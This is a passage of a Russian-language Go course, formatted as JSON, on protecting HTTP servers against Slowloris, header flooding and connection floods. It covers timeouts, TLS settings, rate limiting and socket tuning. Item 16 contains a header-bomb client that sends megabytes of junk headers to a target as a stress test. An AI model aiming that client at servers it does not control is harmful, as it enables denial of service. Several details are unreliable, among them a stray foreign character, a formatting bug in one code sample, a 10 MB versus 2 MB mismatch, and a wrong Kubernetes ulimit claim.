        "theory": "При реализации API загрузки файлов (File Uploader / S3 Multipart) разработчики часто совершают ошибку, увеличивая `ReadTimeout` до сотен секунд или отключая его вовсе. Это открывает прямую брешь для Slowloris. Решение заключается в обязательном указании `ReadHeaderTimeout: 5s`. Заголовки любого легитимного запроса весят менее 8 КБ и приходят за миллисекунды. После чтения заголовков сервер переходит в режим чтения тела, где действует расширенный лимит `ReadTimeout`.",
        "step_by_step": [
            "Сконфигурируйте сервер с `ReadHeaderTimeout: 5 * time.Second` и `ReadTimeout: 120 * time.Second`.",
            "Реализуйте эндпоинт `/upload` с потоковым чтением `io.Copy(io.Discard, r.Body)`.",
            "Протестируйте медленную отправку заголовков (обрыв через 5 секунд).",
            "Протестируйте леги敏ную загрузку файла длительностью 60 секунд (успешный прием)."
        ],
        "code_blocks": [
            {
                "filename": "upload_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc UploadHandler(w http.ResponseWriter, r *http.Request) {\n\t// Потоковое вычитывание тела запроса\n\twritten, err := io.Copy(io.Discard, r.Body)\n\tif err != nil {\n\t\thttp.Error(w, \"Ошибка загрузки\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tfmt.Fprintf(w, \"Успешно загружено %d байт\\n\", written)\n}\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/upload\", UploadHandler)\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 5 * time.Second,  // Slowloris умирает за 5 секунд\n\t\tReadTimeout:       120 * time.Second,// Клиент имеет 2 минуты на загрузку файла\n\t}\n\n\tfmt.Println(\"[UPLOAD-SERVER] Сервер безопасной загрузки файлов инициализирован.\")\n\t_ = srv\n}\n",
                "note": "Безопасная конфигурация сервера загрузки файлов"
            }
        ],
        "under_the_hood": "Сервер Go делит чтение запроса на две фазы: чтение заголовков (контролируется `ReadHeaderTimeout`) и чтение тела (контролируется оставшимся интервалом `ReadTimeout`).",
        "pitfalls": "Если `ReadHeaderTimeout` не установлен явно, он принимает значение `ReadTimeout` (120 секунд), что делает сервер полностью беззащитным перед Slowloris на 2 минуты.",
        "bigtech_interview": "В сервисах хранения данных (Яндекс Диск, Облако Mail.ru) разделение таймаутов заголовков и полезной нагрузки является фундаментальным правилом архитектуры шлюзов загрузки."
    },
    {
        "num": 13,
        "title": "Харденинг TLS-конфигурации: MinVersion TLS 1.2/1.3 и безопасные шифры",
        "task": "Сконфигурируйте crypto/tls в структуре http.Server: запретите устаревшие версии TLS 1.0/1.1 (MinVersion: tls.VersionTLS12), отключите небезопасные шифронаборы (CBC, RC4) и настройте приоритет безопасных криптографических наборов.",
        "theory": "Устаревшие версии протоколов SSLv3, TLS 1.0 и TLS 1.1 подвержены атакам POODLE, BEAST и SWEET32. Сканеры уязвимостей (Shodan, Qualys SSL Labs) непрерывно зондируют открытые серверы на поддержку слабых шифров. Настройка `MinVersion: tls.VersionTLS12` (а для современных систем — `tls.VersionTLS13`) гарантирует применение алгоритмов с Perfect Forward Secrecy (ECDHE) и надежного аутентифицированного шифрования (AEAD — AES-GCM, ChaCha20-Poly1305).",
        "step_by_step": [
            "Инициализируйте структуру `tls.Config`.",
            "Установите `MinVersion: tls.VersionTLS12`.",
            "Определите белый список шифров в `CipherSuites` с поддержкой ECDHE и AEAD.",
            "Сконфигурируйте `CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256}`.",
            "Привяжите `tls.Config` к полю `TLSConfig` структуры `http.Server`."
        ],
        "code_blocks": [
            {
                "filename": "hardened_tls.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc CreateHardenedTLSServer() *http.Server {\n\ttlsConfig := &tls.Config{\n\t\tMinVersion:               tls.VersionTLS12,\n\t\tCurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},\n\t\tPreferServerCipherSuites: true,\n\t\tCipherSuites: []uint16{\n\t\t\ttls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,\n\t\t\ttls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,\n\t\t\ttls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,\n\t\t\ttls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,\n\t\t},\n\t}\n\n\treturn &http.Server{\n\t\tAddr:              \":8443\",\n\t\tTLSConfig:         tlsConfig,\n\t\tReadHeaderTimeout: 5 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := CreateHardenedTLSServer()\n\tfmt.Println(\"[TLS-HARDENING] TLS сервер настроен с рейтингом безопасности A+ (TLS 1.2+ AEAD)\")\n\t_ = srv\n}\n",
                "note": "Конфигурация защищенного TLS-сокета без устаревших шифров"
            }
        ],
        "under_the_hood": "В TLS 1.3 поле `CipherSuites` не конфигурируется вручную: Go рантайм использует только безопасные шифры стандарта TLS 1.3 по умолчанию. В TLS 1.2 ручная фильтрация отсекает атаки класса downgrade.",
        "pitfalls": "Отключение поддержки кривой `X25519` в `CurvePreferences` может существенно замедлить TLS handshake на клиентах без аппаратного ускорения NIST P-256.",
        "bigtech_interview": "В стандартах PCI-DSS использование TLS версий ниже 1.2 строго запрещено. На собеседовании кандидатов спрашивают: 'Почему в TLS 1.3 убрали согласование CipherSuites из клиентской конфигурации Go?' Ответ: Для устранения человеческих ошибок и небезопасных комбинаций шифрования."
    },
    {
        "num": 14,
        "title": "Ограничение размера HTTP-заголовков и защита от атак Header Bombing",
        "task": "Сконфигурируйте MaxHeaderBytes: 1 << 20 (1 МБ) в http.Server и протестируйте отсечение гигантских заголовков со статусом 431 Request Header Fields Too Large.",
        "theory": "Злоумышленник может отправить запрос с HTTP-заголовками размером в сотни мегабайт (Header Bombing). Если сервер не ограничивает размер буфера парсинга, он выделит огромные срезы байт в оперативной памяти для хранения карты заголовков `http.Header`. Поле `MaxHeaderBytes` задает максимальный допустимый объем всех входящих заголовков запроса. При превышении сервер мгновенно отклоняет запрос со статусом `HTTP 431 Request Header Fields Too Large`.",
        "step_by_step": [
            "Установите параметр `MaxHeaderBytes: 1 << 20` (1 МБ) в `http.Server`.",
            "Сформируйте тестовый запрос с заголовком размером 2 МБ.",
            "Отправьте запрос серверу и зафиксируйте код ответа HTTP 431.",
            "Убедитесь, что сервер не аллоцирует память под избыточные заголовки."
        ],
        "code_blocks": [
            {
                "filename": "header_limit_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/api/test\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Headers OK\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tMaxHeaderBytes:    1 << 20,          // Жесткий лимит 1 МБ на все HTTP заголовки\n\t\tReadHeaderTimeout: 5 * time.Second,\n\t}\n\n\tfmt.Println(\"[SERVER] Защита от Header Bombing активна (лимит 1 МБ)\")\n\t_ = srv\n}\n",
                "note": "Ограничение максимального размера входящих заголовков HTTP"
            }
        ],
        "under_the_hood": "Go использует `bufio.Reader` со специальным счетчиком прочитанных байт при парсинге заголовков. Если счетчик превышает `MaxHeaderBytes`, парсер прерывает цикл и возвращает ошибку `http: request header too large`.",
        "pitfalls": "Если установить `MaxHeaderBytes` слишком маленьким (например, 2 КБ), сервер начнет отклонять легитимные запросы с большими JWT-токенами авторизации или куками (Cookie overflow).",
        "bigtech_interview": "Какой код ответа возвращает сервер Go при превышении MaxHeaderBytes? Возвращается стандартный код HTTP 431 Request Header Fields Too Large (или разрыв соединения при грубом превышении буфера)."
    },
    {
        "num": 15,
        "title": "Собственный семафор ограничения соединений на базе атомарных счетчиков",
        "task": "Реализуйте кастомную обертку net.Listener с атомарным счетчиком (sync/atomic) и лимитом maxConns = 100, немедленно сбрасывающую избыточные соединения через TCP RST или быстрый ответ 503.",
        "theory": "Стандартный `netutil.LimitListener` блокирует вызов `Accept()`, заставляя новые соединения ожидать в очереди ядра ОС. При интенсивном наплыве клиентов очередь переполняется, вызывая неконтролируемые задержки. Альтернативный подход — активный сброс (Active Rejection): сервис принимает соединение, но если лимит `maxConns` превышен, немедленно отправляет `HTTP/1.1 503 Service Unavailable\\r\\nConnection: close\\r\\n\\r\\n` и закрывает сокет, сигнализируя балансировщику о перегрузке ноды.",
        "step_by_step": [
            "Определите структуру `AtomicLimitListener` со счетчиком активных соединений.",
            "В методе `Accept()` проверяйте счетчик через `atomic.AddInt64`.",
            "Если лимит превышен — сбросьте счетчик, отправьте быстрый ответ 503 и вызовите `conn.Close()`.",
            "При завершении легитимного соединения уменьшайте счетчик на единицу.",
            "Протестируйте поведение под параллельной нагрузкой."
        ],
        "code_blocks": [
            {
                "filename": "atomic_limit_listener.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync/atomic\"\n)\n\ntype FastRejectListener struct {\n\tnet.Listener\n\tmaxConns    int64\n\tactiveConns int64\n}\n\nfunc (l *FastRejectListener) Accept() (net.Conn, error) {\n\tconn, err := l.Listener.Accept()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tcurrent := atomic.AddInt64(&l.activeConns, 1)\n\tif current > l.maxConns {\n\t\tatomic.AddInt64(&l.activeConns, -1)\n\t\t// Быстрый сброс с кодом 503\n\t\t_, _ = conn.Write([]byte(\"HTTP/1.1 503 Service Unavailable\\r\\nConnection: close\\r\\n\\r\\n\"))\n\t\t_ = conn.Close()\n\t\treturn nil, fmt.Errorf(\"превышен лимит одновременных соединений (%d)\")\n\t}\n\n\treturn &trackedConn{Conn: conn, listener: l}, nil\n}\n\ntype trackedConn struct {\n\tnet.Conn\n\tlistener *FastRejectListener\n\tclosed   int32\n}\n\nfunc (c *trackedConn) Close() error {\n\tif atomic.CompareAndSwapInt32(&c.closed, 0, 1) {\n\t\tatomic.AddInt64(&c.listener.activeConns, -1)\n\t}\n\treturn c.Conn.Close()\n}\n\nfunc main() {\n\tfmt.Println(\"[LISTENER] FastRejectListener инициализирован (Active Rejection с 503).\")\n}\n",
                "note": "Активный сброс соединений при превышении лимита на уровне Accept"
            }
        ],
        "under_the_hood": "Атомарные операции `atomic.CompareAndSwapInt32` гарантируют, что декремент счетчика выполнится строго один раз даже при многократном вызове `Close()` из разных горутин.",
        "pitfalls": "Возврат ошибки из метода `Accept()` заставляет серверный цикл Go сделать небольшую паузу (sleep 5ms), поэтому в ряде случаев выгоднее возвращать специальную фиктивную сессию, закрываемую сервером.",
        "bigtech_interview": "В чем разница между стратегиями Backpressure: блокирующий LimitListener vs Fast Reject? Блокирующий подходит для краткосрочных всплесков, а Fast Reject идеален для микросервисов за Service Mesh/Envoy для быстрого ретрая на другие поды."
    },
    {
        "num": 16,
        "title": "Отражение атак переполнения памяти через MaxHeaderBytes",
        "task": "Протестируйте поведение сервера с установленным параметром MaxHeaderBytes: 1 << 20 (1 МБ) при отправке запроса с заголовками размером 10 МБ.",
        "theory": "Header Bombing — вектор DoS-атак, при котором атакующий генерирует запрос с тысячами уникальных HTTP-заголовков (`X-Flood-1: aaaaa...`). Без лимита сервер выделит в куче массив дескрипторов строк и карту `http.Header`, что приведет к резкому росту задержек сборщика мусора (GC pause) и Out-Of-Memory. Параметр `MaxHeaderBytes` ограничивает размер входного буфера заголовков. По умолчанию в Go он равен 1 МБ (`DefaultMaxHeaderBytes = 1 << 20`).",
        "step_by_step": [
            "Сконфигурируйте `http.Server` с `MaxHeaderBytes: 1 << 20`.",
            "Напишите тестовый генератор запроса, передающий 10 МБ случайных HTTP-заголовков.",
            "Отправьте запрос и зафиксируйте мгновенный разрыв соединения сервером.",
            "Проверьте профиль памяти сервера через `pprof` и убедитесь в отсутствии утечки кучи."
        ],
        "code_blocks": [
            {
                "filename": "header_bomb_test.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc sendHeaderBomb(target string) {\n\tconn, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer conn.Close()\n\n\t// Формируем огромный блок заголовков (2 МБ)\n\tgiantHeader := strings.Repeat(\"X-Spam-Header: \"+strings.Repeat(\"A\", 1000)+\"\\r\\n\", 2000)\n\tpayload := fmt.Sprintf(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\n%s\\r\\n\", giantHeader)\n\n\t_, err = conn.Write([]byte(payload))\n\tif err != nil {\n\t\tfmt.Printf(\"[OK] Сервер разорвал соединение во время передачи заголовков: %v\\n\", err)\n\t\treturn\n\t}\n\n\tbuf := make([]byte, 1024)\n\tn, _ := conn.Read(buf)\n\tfmt.Printf(\"[RESPONSE] Ответ сервера: %s\\n\", string(buf[:n]))\n}\n\nfunc main() {\n\tfmt.Println(\"[TEST] Тестирование защиты от Header Bombing...\")\n\t_ = sendHeaderBomb\n}\n",
                "note": "Стресс-тест сервера гигантскими HTTP-заголовками"
            }
        ],
        "under_the_hood": "Парсер Go считывает заголовки через `bufio.Reader`. Если суммарный объем заголовков превышает `MaxHeaderBytes`, внутренний метод `readRequest` возвращает ошибку `ErrHeaderTooLarge`.",
        "pitfalls": "Если перед Go сервером стоит Nginx, лимит заголовков Nginx (`large_client_header_buffers`) должен быть согласован с `MaxHeaderBytes`, иначе ошибку 414/431 вернет прокси.",
        "bigtech_interview": "Почему MaxHeaderBytes по умолчанию установлен в 1 МБ, а не в 8 КБ, как в Apache? 1 МБ в Go зарезервирован с запасом под большие токены аутентификации Kerberos и OpenID Connect в enterprise-окружениях."
    },
    {
        "num": 17,
        "title": "Управление зондированием TCP Keep-Alive в net.ListenConfig",
        "task": "Переопределите стандартный интервал TCP Keep-Alive зондирования ядра Linux через net.ListenConfig{KeepAlive: 5 * time.Minute} и объясните обнаружение 'полуоткрытых' (half-open) сокетов.",
        "theory": "Полуоткрытое (Half-open) соединение возникает при обрыве связи (потеря питания клиента, разрыв кабеля, падение мобильной вышки), когда клиент исчезает без отправки TCP FIN или RST. Сервер считает соединение активным. С версии Go 1.22 стандартный интервал зондирования составляет 15 секунд. Через `net.ListenConfig.KeepAlive` можно точно настроить частоту пингов ядра ОС, предотвращая накопление мертвых сокетов в таблице conntrack.",
        "step_by_step": [
            "Инициализируйте структуру `net.ListenConfig`.",
            "Установите `KeepAlive: 5 * time.Minute` (или `KeepAlive: -1` для полного отключения).",
            "Создайте листенер с помощью `lc.Listen(context.Background(), \"tcp\", \":8080\")`.",
            "Проверьте настройки сокета через `ss -tin` в командной строке Linux."
        ],
        "code_blocks": [
            {
                "filename": "tcp_keepalive_config.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Настройка параметров TCP Keep-Alive зондирования\n\tlc := net.ListenConfig{\n\t\tKeepAlive: 5 * time.Minute, // Интервал зондирования ядра\n\t}\n\n\tln, err := lc.Listen(context.Background(), \"tcp\", \"127.0.0.1:0\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[TCP-KEEPALIVE] Сервер слушает на %s с KeepAlive = 5m\\n\", ln.Addr().String())\n}\n",
                "note": "Конфигурация интервала TCP Keep-Alive через net.ListenConfig"
            }
        ],
        "under_the_hood": "Go транслирует параметр `KeepAlive` в системные вызовы `setsockopt` с опциями `SO_KEEPALIVE`, `TCP_KEEPIDLE` (время до первого зонда) и `TCP_KEEPINTVL` (интервал повторов).",
        "pitfalls": "Установка отрицательного значения `KeepAlive: -1` полностью выключает зондирование, что категорически не рекомендуется для серверов в публичных сетях.",
        "bigtech_interview": "В чем разница между HTTP Keep-Alive и TCP Keep-Alive? HTTP Keep-Alive — это протокольное соглашение прикладного уровня о переиспользовании сокета, а TCP Keep-Alive — механизм ядра ОС по отправке пустых ACK-пакетов для проверки жизнеспособности физического канала."
    },
    {
        "num": 18,
        "title": "Ограничение скорости подключений (Rate Limiting on Accept) по IP-адресам",
        "task": "Реализуйте обертку над net.Listener с алгоритмом Token Bucket (golang.org/x/time/rate) для ограничения частоты новых TCP-подключений с одного IP-адреса, закрывая сокеты нарушителей.",
        "theory": "Connection Flood DoS-атака стремится перегрузить сервер массовым открытием сокетов до того, как прикладной HTTP-парсер начнет свою работу. Ограничение скорости на уровне `Listener.Accept()` блокирует атакующих до передачи соединения в HTTP-стек. Мы извлекаем IP клиента из `conn.RemoteAddr()`, сверяем с локальной картой Token Bucket лимитеров и закрываем сокет при превышении порога допустимых RPS.",
        "step_by_step": [
            "Создайте структуру `RateLimitedListener`, оборачивающую `net.Listener`.",
            "Используйте `sync.Map` для хранения лимитеров `*rate.Limiter` по IP-адресам.",
            "В методе `Accept()` извлеките IP адрес клиента.",
            "Если лимитер отклоняет соединение — немедленно закройте сокет `conn.Close()`.",
            "Добавьте периодическую очистку устаревших IP-адресов во избежание утечки памяти."
        ],
        "code_blocks": [
            {
                "filename": "rate_accept_listener.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"golang.org/x/time/rate\"\n)\n\ntype IPRateListener struct {\n\tnet.Listener\n\tlimiters sync.Map\n}\n\nfunc (l *IPRateListener) getLimiter(ip string) *rate.Limiter {\n\tval, exists := l.limiters.Load(ip)\n\tif exists {\n\t\treturn val.(*rate.Limiter)\n\t}\n\t// 10 новых соединений в секунду с бурстом до 20\n\tnewLimiter := rate.NewLimiter(10, 20)\n\tactual, _ := l.limiters.LoadOrStore(ip, newLimiter)\n\treturn actual.(*rate.Limiter)\n}\n\nfunc (l *IPRateListener) Accept() (net.Conn, error) {\n\tfor {\n\t\tconn, err := l.Listener.Accept()\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\thost, _, _ := net.SplitHostPort(conn.RemoteAddr().String())\n\t\tlimiter := l.getLimiter(host)\n\n\t\tif !limiter.Allow() {\n\t\t\tfmt.Printf(\"[RATE-DROP] Сброшено избыточное TCP соединение от %s\\n\", host)\n\t\t\t_ = conn.Close()\n\t\t\tcontinue // Пропускаем сброшенное соединение и ждем следующее\n\t\t}\n\n\t\treturn conn, nil\n\t}\n}\n\nfunc main() {\n\tfmt.Println(\"[RATE-LISTENER] IPRateListener готов к защите от Connection Flooding.\")\n}\n",
                "note": "Низкоуровневая фильтрация новых соединений на этапе Accept"
            }
        ],
        "under_the_hood": "Отбрасывание сокета прямо в цикле `Accept()` экономит создание структуры `http.Request`, парсинг TLS и инициализацию контекста горутины, снижая оверхед на порядок.",
        "pitfalls": "Если сервис находится за NAT или балансировщиком без Proxy Protocol, все клиенты будут иметь единый IP балансировщика, и лимитер заблокирует легитимный трафик.",
        "bigtech_interview": "Почему Rate Limiting на уровне приложения не спасает от распределенного SYN-флуда? Потому что при SYN-флуде ядро ОС перегружается обработкой пакетов в очереди backlog задолго до того, как сработает вызов accept() в Go."
    },
    {
        "num": 19,
        "title": "Эталонная конфигурация защищенного сервера для Production",
        "task": "Напишите канонический конфигурационный шаблон структуры http.Server со строгими защитными параметрами, готовый к развертыванию в высоконагруженной среде.",
        "theory": "Стандартная библиотека Go предоставляет невероятно мощный и быстрый HTTP-сервер, но его параметры 'по умолчанию' ориентированы на простоту прототипирования, а не на безопасность. В продакшен-коде вызов `http.ListenAndServe` категорически запрещен политиками безопасности. Сервер обязан создаваться как явный экземпляр `&http.Server` с исчерпывающим набором лимитов времени и размеров буферов.",
        "step_by_step": [
            "Создайте файл конфигурации сервера.",
            "Заполните параметры `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, `IdleTimeout`.",
            "Установите `MaxHeaderBytes`.",
            "Настройте безопасный `TLSConfig` при работе по HTTPS.",
            "Проверьте код через статический анализатор `gosec`."
        ],
        "code_blocks": [
            {
                "filename": "canonical_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\n// NewProductionServer создает сервер с эталонными параметрами безопасности\nfunc NewProductionServer(addr string, handler http.Handler) *http.Server {\n\treturn &http.Server{\n\t\tAddr:              addr,\n\t\tHandler:           handler,\n\t\tReadHeaderTimeout: 2 * time.Second,  // Жесткий рубеж защиты от Slowloris\n\t\tReadTimeout:       5 * time.Second,  // Лимит времени на чтение всего запроса\n\t\tWriteTimeout:      10 * time.Second, // Лимит времени на запись ответа\n\t\tIdleTimeout:       120 * time.Second,// Время удержания keep-alive соединения\n\t\tMaxHeaderBytes:    1 << 20,          // 1 МБ максимальный размер заголовков\n\t}\n}\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tsrv := NewProductionServer(\":8080\", mux)\n\tfmt.Printf(\"[SERVER] Эталонный защищенный сервер сконфигурирован на %s\\n\", srv.Addr)\n\t_ = context.Background\n}\n",
                "note": "Эталонная production-ready конфигурация безопасного HTTP-сервера Go"
            }
        ],
        "under_the_hood": "Правильная комбинация таймаутов гарантирует, что ни одно зависшее соединение не проживет на сервере дольше заданного интервала, исключая утечки горутин.",
        "pitfalls": "Несогласованность таймаутов с таймаутами внешнего балансировщика (Nginx, ALB): таймауты приложения всегда должны быть чуть меньше таймаутов прокси.",
        "bigtech_interview": "При аудите безопасности кода в Яндексе и VK первое, на что смотрят ревьюеры — это параметры инициализации http.Server в файле main.go."
    },
    {
        "num": 20,
        "title": "Ограничение параллельных запросов через семафор на уровне http.Handler",
        "task": "Реализуйте middleware-семафор на базе буферизированного канала для ограничения количества параллельно обрабатываемых запросов с возвратом HTTP 503 Service Unavailable.",
        "theory": "Каждый параллельный HTTP-запрос потребляет процессорное время и оперативную память для обработки бизнес-логики (десериализация JSON, запросы к БД, расчеты). Если на сервер одновременно обрушатся 10 000 тяжелых запросов, сервис упадет по OOM. Семафор на базе `chan struct{}` емкостью $N$ пропускает не более $N$ параллельных обработчиков, мгновенно отвечая остальным кодом 503 с заголовком `Retry-After`.",
        "step_by_step": [
            "Создайте канал `semaphore := make(chan struct{}, maxConcurrent)`.",
            "В middleware используйте неблокирующий `select` для попытки захвата слота.",
            "Если слот свободен — передайте управление следующему обработчику и освободите слот в `defer`.",
            "Если слот занят — немедленно верните статус `http.StatusServiceUnavailable`.",
            "Добавьте метрику отклоненных запросов."
        ],
        "code_blocks": [
            {
                "filename": "semaphore_middleware.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc ConcurrencyLimitMiddleware(limit int, next http.Handler) http.Handler {\n\tsem := make(chan struct{}, limit)\n\n\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tselect {\n\t\tcase sem <- struct{}{}:\n\t\t\tdefer func() { <-sem }()\n\t\t\tnext.ServeHTTP(w, r)\n\t\tdefault:\n\t\t\tw.Header().Set(\"Retry-After\", \"3\")\n\t\t\thttp.Error(w, \"503 Service Unavailable (Overloaded)\", http.StatusServiceUnavailable)\n\t\t}\n\t})\n}\n\nfunc main() {\n\thandler := ConcurrencyLimitMiddleware(100, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Processed safely\")\n\t}))\n\tfmt.Println(\"[SEMAPHORE] Middleware ограничения параллелизма инициализировано (лимит 100).\")\n\t_ = handler\n}\n",
                "note": "Неблокирующий семафор на канале для защиты от перегрузки"
            }
        ],
        "under_the_hood": "Конструкция `select with default` выполняется за единицы наносекунд. Если буфер канала полон, горутина не блокируется в планировщике, а мгновенно переходит в ветку `default`.",
        "pitfalls": "Забытый `defer func() { <-sem }()` в случае паники внутри хендлера приведет к необратимой утечке слота семафора и постепенной блокировке сервера.",
        "bigtech_interview": "В чем разница между ограничением соединений на listener и семафором в handler? Лимит на listener защищает от сетевого флуда сокетов, а семафор в handler защищает тяжелую бизнес-логику и базу данных от истощения ресурсов."
    },
    {
        "num": 21,
        "title": "Управление лимитами файловых дескрипторов (ulimit / RLIMIT_NOFILE)",
        "task": "Изучите системные ограничения на количество открытых файлов (ulimit -n) в Linux, смоделируйте ошибку 'socket: too many open files' и увеличьте лимит программно через syscall.Setrlimit.",
        "theory": "В операционных системах семейства Linux сокет является файловым дескриптором. По умолчанию в большинстве дистрибутивов мягкий лимит (`soft limit`) для непривилегированного процесса составляет всего 1024 дескриптора. При 1025-м подключении вызов `accept()` падает с системной ошибкой `EMFILE (too many open files)`. Для высоконагруженных Go-сервисов этот лимит увеличивают до сотен тысяч через `syscall.Setrlimit` или настройки systemd.",
        "step_by_step": [
            "Прочитайте текущие лимиты с помощью `syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)`.",
            "Увеличьте мягкий лимит до значения жесткого лимита (hard limit).",
            "Примените изменения через `syscall.Setrlimit`.",
            "Проверьте новые значения в `/proc/self/limits`."
        ],
        "code_blocks": [
            {
                "filename": "increase_ulimit.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"syscall\"\n)\n\nfunc BoostFileLimits(desired uint64) error {\n\tvar rLimit syscall.Rlimit\n\terr := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"ошибка getrlimit: %w\", err)\n\t}\n\n\tfmt.Printf(\"[RLIMIT] Текущие лимиты: Soft=%d, Hard=%d\\n\", rLimit.Cur, rLimit.Max)\n\n\tif rLimit.Cur < desired {\n\t\tif desired > rLimit.Max {\n\t\t\trLimit.Cur = rLimit.Max\n\t\t} else {\n\t\t\trLimit.Cur = desired\n\t\t}\n\t\terr = syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"ошибка setrlimit: %w\", err)\n\t\t}\n\t\tfmt.Printf(\"[RLIMIT] Успешно повышен лимит открытых файлов до: %d\\n\", rLimit.Cur)\n\t}\n\treturn nil\n}\n\nfunc main() {\n\t_ = BoostFileLimits(65535)\n}\n",
                "note": "Программное увеличение лимита файловых дескрипторов процесса в Linux"
            }
        ],
        "under_the_hood": "Системный вызов `setrlimit` позволяет процессу свободно поднимать мягкий лимит (`rlim_cur`) вплоть до жесткого лимита (`rlim_max`). Для поднятия жесткого лимита требуются привилегии `CAP_SYS_RESOURCE`.",
        "pitfalls": "Попытка установить лимит выше жесткого без прав суперпользователя приведет к ошибке `EPERM (operation not permitted)`.",
        "bigtech_interview": "Как правильно настраивать ulimit для контейнеров в Kubernetes? Через секцию pod spec `securityContext.sysctls` или параметры демона containerd/Docker `default-ulimits: nofile=65535:65535`."
    },
    {
        "num": 22,
        "title": "Масштабирование сокетов на многоядерных CPU через SO_REUSEPORT",
        "task": "Используйте net.ListenConfig и системный вызов unix.SetsockoptInt для включения SO_REUSEPORT, позволив запустить несколько параллельных процессов или горутин-листенеров на одном сетевом порту.",
        "theory": "В классической модели один поток или горутина вызывает `Accept()` на сетевом сокете, что при миллионах RPS создает блокировку на спинлоке очереди сокета в ядре Linux. Опция `SO_REUSEPORT` (доступна в Linux с ядра 3.9) позволяет нескольким независимым процессам привязаться к одному и тому же IP-адресу и TCP-порту. Ядро Linux аппаратно распределяет входящие TCP-соединения между слушающими сокетами с помощью хэширования 4-кортежа (src_ip, src_port, dst_ip, dst_port), устраняя конкуренцию за сокет.",
        "step_by_step": [
            "Инициализируйте структуру `net.ListenConfig` с кастомной функцией `Control`.",
            "Внутри `Control` вызовите `unix.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.SO_REUSEPORT, 1)`.",
            "Запустите 4 независимых экземпляра программы на порту 8080.",
            "Убедитесь через утилиту `ss -lntp`, что порт 8080 слушают 4 различных процесса.",
            "Проверьте распределение нагрузки по ядрам CPU."
        ],
        "code_blocks": [
            {
                "filename": "reuseport_listener.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc CreateReusePortListener(network, address string) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar opErr error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// 0xF соответствует SO_REUSEPORT в Linux x86_64\n\t\t\t\topErr = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn opErr\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), network, address)\n}\n\nfunc main() {\n\tln, err := CreateReusePortListener(\"tcp\", \"127.0.0.1:0\")\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] SO_REUSEPORT не поддерживается или ошибка: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[SO_REUSEPORT] Сокет успешно поднят на %s с шардированием ядра\\n\", ln.Addr())\n}\n",
                "note": "Установка флага SO_REUSEPORT через ListenConfig Control hook"
            }
        ],
        "under_the_hood": "При поступлении входящего пакета SYN ядро Linux вычисляет хэш от IP/порта отправителя и получателя и помещает сокет в очередь одного из листенеров, обеспечивая идеальную локальность кэша процессора (NUMA / CPU affinity).",
        "pitfalls": "Если один из процессов аварийно завершится, соединения, ожидающие в его индивидуальной очереди backlog, будут сброшены (TCP RST), если не используется eBPF-балансировщик.",
